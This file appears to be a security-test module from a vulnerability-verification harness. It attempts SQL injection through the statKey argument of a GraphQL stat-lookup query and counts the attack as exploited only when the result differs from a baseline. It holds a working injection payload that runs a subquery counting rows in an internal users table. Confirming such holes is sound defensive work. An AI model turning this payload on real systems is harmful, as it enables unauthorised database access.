// Attempts SQL injection through seasonDraftGamePlayerSeasonStatValue's
// `statKey` argument, which lib/db-client's SeasonDraftGameService passes
// into sql.raw(). Reports "exploited" only when a subquery payload returns
// a materially different (non-zero / non-matching) result than the
// legitimate baseline call — a bare "it didn't error" is not evidence.

export const title =
  'injection-statkey: SQL injection via seasonDraftGamePlayerSeasonStatValue.statKey';
export const severity = 'Critical';

const QUERY = `query($p:Int!,$s:Int!,$pos:String!,$t:String!,$k:String!){
  seasonDraftGamePlayerSeasonStatValue(playerId:$p, season:$s, position:$pos, playerType:$t, statKey:$k)
}`;

export async function run({ gql }) {
  const base = { p: 33, s: 2000, pos: '1B', t: 'hitter' };

  const baseline = await gql('nonMember', QUERY, { ...base, k: 'hr' });
  const injected = await gql('nonMember', QUERY, {
    ...base,
    k: '(SELECT count(*) FROM app_internal.users)',
  });

  const baselineVal = baseline.data?.seasonDraftGamePlayerSeasonStatValue;
  const injectedVal = injected.data?.seasonDraftGamePlayerSeasonStatValue;

  // A real injection returns the subquery's result (a row count >= number of
  // seeded personas), not a value identical to — or a validation error like —
  // the honest baseline.
  const exploited =
    !injected.errors &&
    typeof injectedVal === 'number' &&
    injectedVal !== baselineVal &&
    injectedVal > 0;

  return {
    exploited,
    detail:
      `baseline(statKey="hr")=${JSON.stringify(baseline.errors ?? baselineVal)}; ` +
      `injected(statKey=subquery)=${JSON.stringify(injected.errors ?? injectedVal)}`,
  };
}
